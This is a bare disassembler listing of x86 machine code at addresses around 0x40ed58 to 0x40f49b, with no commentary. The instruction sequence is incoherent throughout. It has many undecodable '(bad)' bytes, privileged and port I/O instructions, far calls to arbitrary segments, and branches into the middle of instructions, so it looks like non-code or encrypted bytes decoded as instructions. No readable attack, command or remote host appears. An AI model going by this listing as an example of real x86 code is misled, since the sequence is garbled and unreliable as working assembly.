  40ed58:	and    DWORD PTR [esi-0x6a],ebp
  40ed5b:	inc    edx
  40ed5c:	(bad)  
  40ed5d:	push   esi
  40ed5e:	and    al,bl
  40ed60:	sub    ecx,esp
  40ed62:	or     ecx,DWORD PTR [edx+0x76c8edfc]
  40ed68:	jp     0x40ed7d
  40ed6a:	stos   DWORD PTR es:[edi],eax
  40ed6b:	mov    cl,0x82
  40ed6d:	sub    BYTE PTR [edx-0x7759810f],ah
  40ed73:	imul   ebp,DWORD PTR [ebp-0x8],0x2d8068
  40ed7a:	sub    DWORD PTR [edx+0x6],edx
  40ed7d:	jp     0x40ed56
  40ed7f:	imul   edx,esi,0x62
  40ed82:	cmp    bl,BYTE PTR ds:0xbf64d84c
  40ed88:	sahf   
  40ed89:	inc    esp
  40ed8a:	stos   BYTE PTR es:[edi],al
  40ed8b:	jae    0x40ed4b
  40ed8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed8e:	cwde   
  40ed8f:	jbe    0x40ed26
  40ed91:	push   edx
  40ed92:	and    DWORD PTR ds:[edi+0x7c],ebx
  40ed96:	sub    ecx,ebx
  40ed98:	xchg   ebp,eax
  40ed99:	popa   
  40ed9a:	or     BYTE PTR [ebx],dl
  40ed9c:	imul   esp,DWORD PTR [eax+0x42c03814],0x8ef7da8a
  40eda6:	pusha  
  40eda7:	(bad)  
  40eda8:	jg     0x40edfb
  40edaa:	rcr    BYTE PTR [ecx],0xbd
  40edad:	retf   0xa973
  40edb0:	pop    esp
  40edb1:	fst    DWORD PTR [eax-0x30ac868c]
  40edb7:	shr    BYTE PTR [ecx+0x1c1ec9cd],0x9a
  40edbe:	adc    al,0xb9
  40edc0:	hlt    
  40edc1:	aaa    
  40edc2:	out    dx,eax
  40edc3:	shr    DWORD PTR [eax],1
  40edc5:	ret    
  40edc6:	scas   al,BYTE PTR es:[edi]
  40edc7:	arpl   WORD PTR ds:0xc48a5661,si
  40edcd:	mov    ds:0xa4abb8dd,eax
  40edd2:	test   DWORD PTR [ebp-0x50],ecx
  40edd5:	fsub   DWORD PTR [eax]
  40edd7:	ins    BYTE PTR es:[edi],dx
  40edd8:	pop    esi
  40edd9:	es pop edx
  40eddb:	(bad)  
  40eddc:	shl    BYTE PTR [edx+eax*4-0x34b3021b],cl
  40ede3:	mov    esi,0x2350b0b
  40ede8:	push   ecx
  40ede9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edea:	loop   0x40eda4
  40edec:	lea    edi,[ecx+eax*1]
  40edef:	icebp  
  40edf0:	cmc    
  40edf1:	repnz pop ecx
  40edf3:	xchg   BYTE PTR [eax+0x14acc6fb],bl
  40edf9:	ins    DWORD PTR es:[edi],dx
  40edfa:	outs   dx,BYTE PTR ds:[esi]
  40edfb:	mov    cl,0x54
  40edfd:	jl     0x40ee36
  40edff:	mov    bl,0x64
  40ee01:	jae    0x40ee48
  40ee03:	mov    eax,ds:0xfe78384c
  40ee08:	xor    BYTE PTR [edi],ah
  40ee0a:	fnstcw WORD PTR [ebx]
  40ee0c:	push   0x8e7ac022
  40ee11:	jmp    0x40edbe
  40ee13:	aam    0xcd
  40ee15:	mov    ds:0xb939e93e,al
  40ee1a:	rcl    BYTE PTR [eax],cl
  40ee1c:	std    
  40ee1d:	push   edi
  40ee1e:	(bad)  
  40ee1f:	imul   ecx,DWORD PTR [eax+0x7acec5df],0x24b3e060
  40ee29:	sbb    ebx,DWORD PTR [ecx+eax*1-0x6e]
  40ee2d:	pop    ds
  40ee2e:	shl    DWORD PTR [ebp+ebx*2+0x6dad09fc],1
  40ee35:	aas    
  40ee36:	or     al,0x78
  40ee38:	pushf  
  40ee39:	mov    ds:0x52d33cbb,al
  40ee3e:	cmp    bh,BYTE PTR [ebx]
  40ee40:	sar    DWORD PTR [ebx+0x73],0x4c
  40ee44:	pop    ebp
  40ee45:	mov    edx,0x101f5ae9
  40ee4a:	dec    esp
  40ee4b:	mov    dh,0x26
  40ee4d:	inc    ebx
  40ee4e:	ret    
  40ee4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee50:	inc    ebp
  40ee51:	or     BYTE PTR [esi-0x3e],cl
  40ee54:	loope  0x40ee3a
  40ee56:	mov    cl,0x55
  40ee58:	jo     0x40eed5
  40ee5a:	int3   
  40ee5b:	mov    gs,ebx
  40ee5d:	sbb    edi,DWORD PTR [edx]
  40ee5f:	adc    eax,0x36d8db49
  40ee64:	and    BYTE PTR [ecx],0xc2
  40ee67:	test   esp,edx
  40ee69:	bound  esi,QWORD PTR [ecx+0x2542c957]
  40ee6f:	cmp    eax,0x790dd142
  40ee74:	popf   
  40ee75:	in     al,dx
  40ee76:	mov    DWORD PTR [edi+ebx*1+0x15],ecx
  40ee7a:	inc    edi
  40ee7b:	out    dx,eax
  40ee7c:	(bad)  
  40ee7e:	mov    al,ds:0x3ea53d85
  40ee83:	pushf  
  40ee84:	adc    BYTE PTR [ecx-0x51744dcf],bh
  40ee8a:	leave  
  40ee8b:	pop    es
  40ee8c:	lds    ebx,FWORD PTR [esi]
  40ee8e:	or     ah,BYTE PTR [ebx]
  40ee90:	mov    ds:0xdbf997da,eax
  40ee95:	push   es
  40ee96:	popf   
  40ee97:	jno    0x40eefd
  40ee99:	jmp    0xad643777
  40ee9e:	mov    ch,0x8b
  40eea0:	sub    eax,0x30ae4eb4
  40eea5:	arpl   WORD PTR [eax+0x476016d4],bp
  40eeab:	clc    
  40eeac:	xor    eax,0x9d028b9b
  40eeb1:	cld    
  40eeb2:	jb     0x40ee7a
  40eeb4:	cdq    
  40eeb5:	out    dx,eax
  40eeb6:	test   DWORD PTR [ebp+0x2e8a76bf],esi
  40eebc:	mov    bl,0xa
  40eebe:	ins    DWORD PTR es:[edi],dx
  40eebf:	jge    0x40ef22
  40eec1:	aad    0xb4
  40eec3:	pop    ebx
  40eec4:	xor    al,0x3c
  40eec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eec7:	sub    bl,BYTE PTR [eax+edx*2]
  40eeca:	call   0xf979:0x4fed4950
  40eed1:	mov    edi,ebx
  40eed3:	ret    
  40eed4:	adc    al,0x44
  40eed6:	add    eax,0x6d70c03
  40eedb:	add    ah,bl
  40eedd:	lods   al,BYTE PTR ds:[esi]
  40eede:	sar    DWORD PTR [ecx+0x320822eb],cl
  40eee4:	sub    DWORD PTR [ebx],edx
  40eee6:	jns    0x40eed8
  40eee8:	out    dx,al
  40eee9:	sbb    BYTE PTR [edi],0xb0
  40eeec:	jo     0x40eee5
  40eeee:	loop   0x40ef41
  40eef0:	out    0xb5,al
  40eef2:	into   
  40eef3:	mov    esp,0xb4ea1210
  40eef8:	pop    ebx
  40eef9:	xchg   esp,eax
  40eefa:	inc    ebp
  40eefb:	sub    BYTE PTR [ecx+0x1e],bh
  40eefe:	or     DWORD PTR [edx+0x5856ea5a],ebx
  40ef04:	push   0x2f034f5e
  40ef09:	jb     0x40eea3
  40ef0b:	je     0x40eed6
  40ef0d:	xchg   BYTE PTR [edx],bh
  40ef0f:	mov    dh,0xca
  40ef11:	xchg   DWORD PTR [ebx+0x44],esi
  40ef14:	jl     0x40eea6
  40ef16:	mov    ebx,0x842a6dea
  40ef1c:	mul    DWORD PTR [ecx+0x102e5fd1]
  40ef22:	les    ebp,FWORD PTR [ebp-0x3d]
  40ef25:	mov    gs,WORD PTR [eax]
  40ef27:	shr    edx,0xd2
  40ef2a:	test   al,0xbd
  40ef2c:	fmul   QWORD PTR [edi-0x6e]
  40ef2f:	(bad)  
  40ef31:	pusha  
  40ef32:	ja     0x40ef7f
  40ef34:	stos   DWORD PTR es:[edi],eax
  40ef35:	dec    ebx
  40ef36:	adc    al,0x57
  40ef38:	mov    ch,BYTE PTR [ecx+ecx*4+0x5c229a94]
  40ef3f:	jbe    0x40efbe
  40ef41:	jle    0x40ef2b
  40ef43:	sub    al,0x62
  40ef45:	mov    ebx,ss
  40ef47:	sub    dl,BYTE PTR [ebx+0x7db9ff20]
  40ef4d:	inc    eax
  40ef4e:	retf   
  40ef4f:	enter  0x7c3c,0xea
  40ef53:	call   0x97b8:0x704de5e9
  40ef5a:	push   0x45
  40ef5c:	cmp    esp,DWORD PTR [eax]
  40ef5e:	mov    ch,0x9d
  40ef60:	pop    es
  40ef61:	ins    BYTE PTR es:[edi],dx
  40ef62:	test   al,0x5b
  40ef64:	out    0xa4,al
  40ef66:	pop    ebx
  40ef67:	adc    BYTE PTR [ebp+0x92b021d],ch
  40ef6d:	enter  0xd356,0x96
  40ef71:	push   ds
  40ef72:	xchg   esp,eax
  40ef73:	xchg   ecx,eax
  40ef74:	xor    al,0x23
  40ef76:	sti    
  40ef77:	sub    al,BYTE PTR [edi+0x4511853e]
  40ef7d:	ins    DWORD PTR es:[edi],dx
  40ef7e:	out    dx,eax
  40ef7f:	jg     0x40ef6b
  40ef81:	jns    0x40ef08
  40ef83:	(bad)  
  40ef84:	int    0x63
  40ef86:	sbb    cl,BYTE PTR [eax+0x2906fdad]
  40ef8c:	mov    WORD PTR [ebx+0x17],es
  40ef8f:	and    DWORD PTR [ebp+0x1e2f1298],esp
  40ef95:	cwde   
  40ef96:	sti    
  40ef97:	cmp    BYTE PTR ds:0xeee1af6a,cl
  40ef9d:	in     al,dx
  40ef9e:	xchg   esi,eax
  40ef9f:	mov    edi,edi
  40efa1:	aaa    
  40efa2:	in     al,dx
  40efa3:	clc    
  40efa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efa5:	lea    ecx,[esi]
  40efa7:	test   eax,0xadbd12a0
  40efac:	(bad)  
  40efad:	nop
  40efae:	aaa    
  40efaf:	sbb    BYTE PTR [eax+0x2f5c6820],dh
  40efb5:	and    al,0xa3
  40efb7:	(bad)  
  40efb8:	scas   eax,DWORD PTR es:[edi]
  40efb9:	pusha  
  40efba:	dec    edx
  40efbb:	dec    ecx
  40efbc:	outs   dx,DWORD PTR ds:[esi]
  40efbd:	icebp  
  40efbe:	inc    edx
  40efbf:	into   
  40efc0:	call   0xfd93:0x5fe211c5
  40efc7:	xchg   esi,eax
  40efc8:	daa    
  40efc9:	jo     0x40efae
  40efcb:	imul   BYTE PTR [ecx+0x14bd074]
  40efd1:	iret   
  40efd2:	mov    edi,0xd1d78eab
  40efd7:	adc    eax,0xaa18f3b0
  40efdc:	loopne 0x40f033
  40efde:	das    
  40efdf:	bound  ebx,QWORD PTR [eax+0x33]
  40efe2:	add    eax,0x817e1d65
  40efe7:	call   0x94f0ae72
  40efec:	in     eax,0x90
  40efee:	ret    
  40efef:	in     eax,0xd0
  40eff1:	outs   dx,DWORD PTR ds:[esi]
  40eff2:	xchg   edx,eax
  40eff3:	xchg   edi,eax
  40eff4:	lock adc eax,0x9378089e
  40effa:	push   ss
  40effb:	adc    BYTE PTR [edi-0x4e],0x73
  40efff:	in     al,dx
  40f000:	(bad)  
  40f001:	cld    
  40f002:	mov    ds:0x5795c7f,eax
  40f007:	sbb    al,0xfc
  40f009:	inc    edi
  40f00a:	adc    al,0xd
  40f00c:	ret    0x9285
  40f00f:	push   ss
  40f010:	jns    0x40f041
  40f012:	ins    BYTE PTR es:[edi],dx
  40f013:	jge    0x40efc2
  40f015:	add    BYTE PTR es:[bx+si+0x6bcd],ch
  40f01b:	das    
  40f01c:	dec    edx
  40f01d:	les    ecx,FWORD PTR [edi-0x23]
  40f020:	or     BYTE PTR [esi+0x6b],ah
  40f023:	push   ebx
  40f024:	out    dx,eax
  40f025:	fnstenv [edx+0x7e29ca28]
  40f02b:	add    ebp,DWORD PTR [ebx-0x55]
  40f02e:	shr    BYTE PTR [ecx+eiz*4+0x6fdd353f],0x2c
  40f036:	pop    edi
  40f037:	fld    st(7)
  40f039:	jecxz  0x40eff7
  40f03b:	mov    edi,0x35afb417
  40f040:	xchg   ebx,eax
  40f041:	mov    ds:0xc255353e,al
  40f046:	mov    fs,WORD PTR [esi+eax*2-0x2fd4c1f0]
  40f04d:	cdq    
  40f04e:	icebp  
  40f04f:	enter  0x8f2e,0x0
  40f053:	ror    DWORD PTR [ebx-0x5f555b03],1
  40f059:	xor    BYTE PTR [ecx],al
  40f05b:	or     edi,esp
  40f05d:	and    ch,ah
  40f05f:	scas   al,BYTE PTR es:[edi]
  40f060:	push   eax
  40f061:	(bad)  
  40f062:	mov    cl,0xe2
  40f064:	push   ebp
  40f065:	adc    eax,0x9795b6aa
  40f06a:	pusha  
  40f06b:	and    al,0xfd
  40f06e:	sti    
  40f06f:	js     0x40f054
  40f071:	cmp    bl,BYTE PTR [eax]
  40f073:	fsub   QWORD PTR [eax-0x78]
  40f076:	in     al,0x5
  40f078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f079:	fwait
  40f07a:	bnd jge 0x40f078
  40f07d:	dec    edx
  40f07e:	cmp    DWORD PTR [ecx],ebp
  40f080:	rcr    BYTE PTR [edx-0x37],1
  40f083:	add    al,0x68
  40f085:	add    bh,BYTE PTR [ebx+0x3c]
  40f088:	ficom  WORD PTR [eax+0x5317f19a]
  40f08e:	je     0x40f02b
  40f090:	push   0xffffffcb
  40f092:	dec    eax
  40f093:	call   0xf4a9c620
  40f098:	nop
  40f099:	mov    ds,WORD PTR ds:0x7deed6e3
  40f09f:	inc    ebp
  40f0a0:	xchg   esi,eax
  40f0a1:	jae    0x40f065
  40f0a3:	mov    ecx,0x7b641da9
  40f0a8:	test   al,0x5
  40f0aa:	or     ah,BYTE PTR [bp+di]
  40f0ad:	pop    bp
  40f0af:	ficomp WORD PTR [esi-0xea964c0]
  40f0b5:	push   edx
  40f0b6:	inc    ebp
  40f0b7:	xchg   ebx,eax
  40f0b8:	pop    edx
  40f0b9:	jecxz  0x40f05b
  40f0bb:	hlt    
  40f0bc:	lods   eax,DWORD PTR ds:[esi]
  40f0bd:	cmp    eax,0xc0e16421
  40f0c2:	dec    ebp
  40f0c3:	lock pop esi
  40f0c5:	adc    BYTE PTR [edi+edx*4],0xa3
  40f0c9:	add    dh,BYTE PTR [edx]
  40f0cb:	lock cmc 
  40f0cd:	pop    ebp
  40f0ce:	or     BYTE PTR [esi+0x32],0x2b
  40f0d2:	or     DWORD PTR [eax-0x409a327b],0xa46e5454
  40f0dc:	and    eax,0xc1726941
  40f0e1:	inc    edi
  40f0e2:	lods   eax,DWORD PTR ds:[esi]
  40f0e3:	xchg   esi,eax
  40f0e4:	adc    DWORD PTR [esi-0x35246ddf],eax
  40f0ea:	add    edi,esp
  40f0ec:	mov    esi,0x692bb885
  40f0f1:	addr16 loop 0x40f0f2
  40f0f4:	mov    ds:0x1df3feae,eax
  40f0f9:	popf   
  40f0fa:	repz (bad) 
  40f0fc:	mov    bh,0xbf
  40f0fe:	or     al,0xed
  40f100:	mov    ebx,0xe3d56d2
  40f105:	mov    eax,0xa5d60d1e
  40f10a:	cs mov cl,0xa4
  40f10d:	dec    esi
  40f10e:	loop   0x40f186
  40f110:	mov    ebx,0x3ca45a4e
  40f115:	mov    BYTE PTR [esi-0x619cde22],bh
  40f11b:	or     DWORD PTR [edi+edx*4+0x179e758b],ebx
  40f122:	push   esi
  40f123:	(bad)  
  40f124:	and    dh,bh
  40f126:	mov    dl,0x8c
  40f128:	xchg   edx,eax
  40f129:	ds sbb al,0x52
  40f12c:	hlt    
  40f12d:	rcr    BYTE PTR [edi-0x26],0xeb
  40f131:	mov    WORD PTR [ebx],?
  40f133:	jp     0x40f133
  40f135:	xchg   esp,esi
  40f137:	into   
  40f138:	pop    esp
  40f139:	aas    
  40f13a:	mul    edx
  40f13c:	push   cs
  40f13d:	outs   dx,BYTE PTR ds:[esi]
  40f13e:	loop   0x40f0c2
  40f140:	sub    ebp,esi
  40f142:	inc    ebx
  40f143:	or     eax,0x4f628fa1
  40f148:	cmp    ch,dh
  40f14a:	xor    BYTE PTR [ecx+0x57],cl
  40f14d:	mov    eax,0xe928c79
  40f152:	sbb    dh,cl
  40f154:	cmp    eax,0xfbed7b43
  40f159:	clc    
  40f15a:	popa   
  40f15b:	jns    0x40f162
  40f15d:	xchg   ebp,eax
  40f15e:	in     eax,dx
  40f15f:	inc    DWORD PTR [edx+0x649517a4]
  40f165:	sub    BYTE PTR [ecx],dh
  40f167:	push   ds
  40f168:	test   ebx,esi
  40f16a:	iret   
  40f16b:	sbb    eax,0x882b4763
  40f170:	mov    bh,0x84
  40f172:	xchg   edx,eax
  40f173:	shl    DWORD PTR [esi],0xb2
  40f176:	jno    0x40f128
  40f178:	repz sub eax,DWORD PTR [edx]
  40f17b:	sbb    BYTE PTR [esi+edi*1+0x7ad2d124],ch
  40f182:	cs mov ecx,0xf3ed4a78
  40f188:	add    al,0x0
  40f18a:	mov    bl,0x9f
  40f18c:	mov    BYTE PTR [edi],dl
  40f18e:	pop    eax
  40f18f:	pop    esp
  40f190:	and    eax,0x52bde370
  40f195:	or     DWORD PTR [edi+0x43],eax
  40f198:	or     eax,0xa99be343
  40f19d:	dec    esp
  40f19e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f19f:	xor    BYTE PTR [esi],ah
  40f1a1:	pop    ebp
  40f1a2:	outs   dx,DWORD PTR ds:[esi]
  40f1a3:	lahf   
  40f1a4:	int    0x3
  40f1a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1a7:	mov    ecx,0x423d9262
  40f1ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ad:	and    eax,0xd731b4de
  40f1b2:	adc    al,0xfa
  40f1b4:	dec    ecx
  40f1b5:	outs   dx,DWORD PTR ds:[esi]
  40f1b6:	int    0xfc
  40f1b8:	and    BYTE PTR [ecx+0x63515df3],0x3f
  40f1bf:	(bad)  
  40f1c0:	cmc    
  40f1c1:	lds    edi,FWORD PTR [ebx+0x1e]
  40f1c4:	jb     0x40f207
  40f1c6:	test   DWORD PTR [ebx+edx*4+0x37],edi
  40f1ca:	mov    ds:0x1461cb39,eax
  40f1cf:	hlt    
  40f1d0:	hlt    
  40f1d1:	sub    al,0x48
  40f1d3:	add    edi,edx
  40f1d5:	or     dl,BYTE PTR [ebx+eiz*8+0x63]
  40f1d9:	shl    DWORD PTR [eax-0x1b],cl
  40f1dc:	cmp    BYTE PTR [eax],dl
  40f1de:	imul   ebp,DWORD PTR [esi],0x54
  40f1e1:	aas    
  40f1e2:	push   edi
  40f1e3:	xchg   dx,ax
  40f1e5:	pop    eax
  40f1e6:	dec    esi
  40f1e7:	cmc    
  40f1e8:	lea    ebp,[edi+eiz*2+0x18f85fc3]
  40f1ef:	xchg   esp,eax
  40f1f0:	pop    es
  40f1f1:	mov    ebx,0x495b7038
  40f1f6:	mov    bl,BYTE PTR [eax-0x7]
  40f1f9:	adc    ecx,DWORD PTR [edx-0x3206b45b]
  40f1ff:	xchg   dh,dl
  40f201:	stos   DWORD PTR es:[edi],eax
  40f202:	retf   
  40f203:	or     dh,BYTE PTR [esi]
  40f205:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40f207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f208:	add    bh,bh
  40f20a:	test   al,0xe2
  40f20c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f20d:	jo     0x40f241
  40f20f:	inc    ebx
  40f210:	cmp    DWORD PTR [ebp+0x55],ebp
  40f213:	int    0x77
  40f215:	dec    ecx
  40f216:	jbe    0x40f263
  40f218:	int    0x4a
  40f21a:	into   
  40f21b:	push   edi
  40f21c:	jmp    0x40f1ba
  40f21e:	(bad)  
  40f21f:	mov    cl,0x45
  40f221:	or     eax,0xa7f06fad
  40f226:	xchg   ebx,eax
  40f227:	ja     0x40f1dd
  40f229:	mov    esp,0xa0ecfa67
  40f22e:	popf   
  40f22f:	not    al
  40f231:	sub    al,0x33
  40f233:	popf   
  40f234:	pop    ecx
  40f235:	in     eax,dx
  40f236:	adc    ch,dh
  40f238:	lea    edi,[eax+0x5]
  40f23b:	xlat   BYTE PTR ds:[ebx]
  40f23c:	fisttp DWORD PTR [edx-0x44]
  40f23f:	int    0xa1
  40f241:	fild   QWORD PTR [edx]
  40f243:	pop    es
  40f244:	xor    ch,cl
  40f246:	inc    eax
  40f247:	shl    DWORD PTR [edx-0x2472e89a],1
  40f24d:	jbe    0x40f253
  40f24f:	push   ds
  40f250:	lock test eax,0x4bc9bfeb
  40f256:	mov    ebx,0x4ef9938a
  40f25b:	loopne 0x40f1ed
  40f25d:	sar    BYTE PTR [eax+0x2e],cl
  40f260:	neg    bh
  40f262:	lods   eax,DWORD PTR ds:[esi]
  40f263:	mov    esi,0xc64caf6f
  40f268:	adc    al,BYTE PTR [ebx+0x3d]
  40f26b:	push   esp
  40f26c:	or     ebp,DWORD PTR [eax]
  40f26e:	sub    al,0x97
  40f270:	xlat   BYTE PTR ds:[ebx]
  40f271:	pusha  
  40f272:	out    dx,eax
  40f273:	imul   ebx,DWORD PTR [eax-0x6250e037],0xb4c0d85c
  40f27d:	cmp    bh,BYTE PTR [ebp+ebx*2+0x76]
  40f281:	hlt    
  40f282:	ds ret 
  40f284:	test   al,0x5a
  40f286:	retf   0x6f6a
  40f289:	test   eax,0x4803c698
  40f28f:	fmulp  st(1),st
  40f291:	cli    
  40f292:	dec    ebp
  40f293:	div    BYTE PTR [edx+esi*2+0x6c]
  40f297:	jo     0x40f21e
  40f299:	inc    ebp
  40f29a:	and    eax,ecx
  40f29c:	pop    edi
  40f29d:	(bad)  
  40f29e:	and    DWORD PTR [ecx],ebx
  40f2a0:	int3   
  40f2a1:	lds    eax,FWORD PTR [ebx]
  40f2a3:	mov    bl,0x2d
  40f2a5:	std    
  40f2a6:	sub    dh,BYTE PTR ds:0x18eab57e
  40f2ac:	jnp    0x40f290
  40f2ae:	xchg   ebx,eax
  40f2af:	stos   BYTE PTR es:[edi],al
  40f2b0:	fwait
  40f2b1:	bound  ecx,QWORD PTR [edx-0x1a]
  40f2b4:	push   ecx
  40f2b5:	arpl   WORD PTR [ebx+0x4d],dx
  40f2b8:	cmp    BYTE PTR [edx],ch
  40f2ba:	(bad)  
  40f2bb:	sub    eax,0x61633ebf
  40f2c0:	scas   eax,DWORD PTR es:[edi]
  40f2c1:	stos   DWORD PTR es:[edi],eax
  40f2c2:	(bad)  
  40f2c3:	out    dx,al
  40f2c4:	sub    al,0xfe
  40f2c6:	retf   0x9d79
  40f2c9:	jle    0x40f305
  40f2cb:	sub    al,BYTE PTR [eax+0x4e8d1d0d]
  40f2d1:	inc    ebp
  40f2d2:	jnp    0x40f26b
  40f2d4:	or     esi,DWORD PTR [ecx]
  40f2d6:	xor    al,0x91
  40f2d8:	pop    ds
  40f2d9:	jb     0x40f352
  40f2db:	inc    esp
  40f2dc:	adc    eax,0x7a54e51c
  40f2e1:	call   0x60293097
  40f2e6:	pop    ds
  40f2e7:	hlt    
  40f2e8:	out    dx,eax
  40f2e9:	lods   eax,DWORD PTR ds:[esi]
  40f2ea:	ret    
  40f2eb:	push   es
  40f2ec:	sahf   
  40f2ed:	or     esp,DWORD PTR [ebx]
  40f2ef:	push   ebp
  40f2f0:	pop    esp
  40f2f1:	and    bl,BYTE PTR [ecx]
  40f2f3:	cmp    dl,BYTE PTR [edx+eax*2-0x3cf131]
  40f2fa:	jl     0x40f30f
  40f2fc:	test   eax,0xdd4747b
  40f301:	icebp  
  40f302:	xor    esi,DWORD PTR [edx]
  40f304:	mov    bh,0x35
  40f306:	shl    DWORD PTR [edi],1
  40f308:	ss nop
  40f30a:	pop    esp
  40f30b:	fisub  DWORD PTR [edi]
  40f30d:	fiadd  WORD PTR [ecx+0x61626911]
  40f313:	dec    edi
  40f314:	iret   
  40f315:	and    BYTE PTR [esi-0x523e2a0a],0xbc
  40f31c:	add    esp,DWORD PTR [eax+0x3dd7b88e]
  40f322:	test   BYTE PTR [edx-0x19f78601],0x1d
  40f329:	xor    ebp,esi
  40f32b:	add    eax,DWORD PTR [edi-0x4a0cbe72]
  40f331:	pop    esi
  40f332:	mov    dl,0xfa
  40f334:	fst    st(6)
  40f336:	mov    ch,0xc
  40f338:	sbb    eax,0x3fcef465
  40f33d:	into   
  40f33e:	out    dx,al
  40f33f:	inc    esi
  40f340:	outs   dx,BYTE PTR ds:[esi]
  40f341:	dec    eax
  40f342:	je     0x40f33d
  40f344:	mov    BYTE PTR [edi+0x68],dh
  40f347:	stos   BYTE PTR es:[edi],al
  40f348:	push   cs
  40f349:	fstp   QWORD PTR [ebx+0x127538db]
  40f34f:	test   al,0x3c
  40f351:	call   0x9ebaa6a7
  40f356:	stos   BYTE PTR es:[edi],al
  40f357:	cmc    
  40f358:	mov    edx,0xacebe242
  40f35d:	outs   dx,DWORD PTR ds:[esi]
  40f35e:	in     eax,0x75
  40f360:	mov    ah,0xb1
  40f362:	mov    dh,0x24
  40f364:	loopne 0x40f2fa
  40f366:	mov    ecx,0xe830f39d
  40f36b:	or     DWORD PTR [ebp-0x3aaadf54],edi
  40f371:	or     ch,dh
  40f373:	lods   al,BYTE PTR ds:[esi]
  40f374:	inc    ebp
  40f375:	push   esi
  40f376:	dec    edi
  40f377:	pop    eax
  40f378:	push   eax
  40f379:	inc    ecx
  40f37a:	bound  esp,QWORD PTR ds:0x67f3e522
  40f380:	(bad)  
  40f381:	test   al,bh
  40f383:	popf   
  40f384:	retf   
  40f385:	jge    0x40f318
  40f387:	jbe    0x40f3b7
  40f389:	lea    ecx,[ebx-0x48]
  40f38c:	or     BYTE PTR [ebp+ecx*1+0x715e55e5],al
  40f393:	lock sti 
  40f395:	adc    ebx,esp
  40f397:	cmp    BYTE PTR [edi],0xb5
  40f39a:	adc    DWORD PTR [ebx+0x3654bc2c],ebx
  40f3a0:	mov    dl,0x45
  40f3a2:	push   es
  40f3a3:	inc    esp
  40f3a4:	in     eax,dx
  40f3a5:	pop    es
  40f3a6:	outs   dx,BYTE PTR ds:[esi]
  40f3a7:	test   DWORD PTR [edx-0x74],esp
  40f3aa:	nop
  40f3ab:	push   ecx
  40f3ac:	icebp  
  40f3ad:	push   ss
  40f3ae:	std    
  40f3af:	adc    dh,BYTE PTR [ebp-0x2e3d9eb3]
  40f3b5:	pusha  
  40f3b6:	cmp    bl,dl
  40f3b8:	jecxz  0x40f3cc
  40f3ba:	fnstsw WORD PTR [eax-0x22]
  40f3bd:	aaa    
  40f3be:	xor    ecx,DWORD PTR [ebp-0x14]
  40f3c1:	mov    DWORD PTR [ebx-0x7257f755],edx
  40f3c7:	pop    eax
  40f3c8:	lods   eax,DWORD PTR ds:[esi]
  40f3c9:	adc    ebx,ebp
  40f3cb:	jecxz  0x40f363
  40f3cd:	out    0xa1,eax
  40f3cf:	shl    DWORD PTR [ebx+edx*8-0x57],1
  40f3d3:	jmp    0x40f3e5
  40f3d5:	inc    ecx
  40f3d6:	push   edx
  40f3d7:	push   eax
  40f3d8:	std    
  40f3d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3da:	cld    
  40f3db:	mov    ebp,0x40384276
  40f3e0:	sti    
  40f3e1:	popf   
  40f3e2:	popa   
  40f3e3:	add    dl,al
  40f3e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3e6:	add    edi,edx
  40f3e8:	mov    al,ds:0x4dab8f50
  40f3ed:	and    DWORD PTR [esi+eiz*8],edi
  40f3f0:	enter  0x9614,0x60
  40f3f4:	pop    ebx
  40f3f5:	lea    ecx,[esi]
  40f3f7:	cdq    
  40f3f8:	stc    
  40f3f9:	fdiv   st(5),st
  40f3fb:	sbb    BYTE PTR [ebp-0x52],ah
  40f3fe:	pusha  
  40f3ff:	mov    DWORD PTR [edx+ebp*8-0x2f4efca],0xdb25e7a7
  40f40a:	cs ret 0xd0d0
  40f40e:	(bad)  
  40f40f:	dec    ecx
  40f410:	loop   0x40f482
  40f412:	fnstcw WORD PTR [ebx]
  40f414:	push   0x8dc44af
  40f419:	dec    ecx
  40f41a:	ja     0x40f459
  40f41c:	adc    esp,DWORD PTR [esi]
  40f41e:	adc    BYTE PTR [edx-0x3aa35d6f],al
  40f424:	imul   esp,DWORD PTR [edx-0x7c54b59a],0x2a
  40f42b:	dec    esi
  40f42c:	mov    es,esi
  40f42e:	or     al,0x92
  40f430:	pusha  
  40f431:	cmc    
  40f432:	je     0x40f3dd
  40f434:	push   esi
  40f435:	ss mov dh,0x14
  40f438:	sub    bh,BYTE PTR [ebx]
  40f43a:	fisub  DWORD PTR [edx+0x65]
  40f43d:	js     0x40f416
  40f43f:	cli    
  40f440:	loopne 0x40f3fb
  40f442:	shr    DWORD PTR [ebx],cl
  40f444:	jnp    0x40f3fb
  40f446:	dec    eax
  40f447:	cli    
  40f448:	push   es
  40f449:	sub    al,0xc1
  40f44b:	add    al,0xd6
  40f44d:	mov    eax,ds:0x49425c0a
  40f452:	jnp    0x40f450
  40f454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f455:	cmp    al,0x78
  40f457:	ror    BYTE PTR [edx-0x18],0x58
  40f45b:	mov    esi,0x1a90687f
  40f460:	jecxz  0x40f476
  40f462:	sub    eax,0x92ef63d1
  40f467:	cmp    esp,ebp
  40f469:	fisub  DWORD PTR ds:0x72d9d837
  40f46f:	test   eax,0xabc16c54
  40f474:	call   0x491d:0xa506f4d5
  40f47b:	push   eax
  40f47c:	adc    esp,DWORD PTR [ebp-0x6]
  40f47f:	or     eax,0x89069269
  40f484:	cdq    
  40f485:	mov    ds:0xaf715606,al
  40f48a:	aad    0x9
  40f48c:	and    al,0xee
  40f48e:	jns    0x40f4c2
  40f490:	dec    BYTE PTR [ebx+0x55a9e0e]
  40f496:	call   0x8cfe7046
  40f49b:	fidivr WORD PTR [ebx-0x6b4d653f]
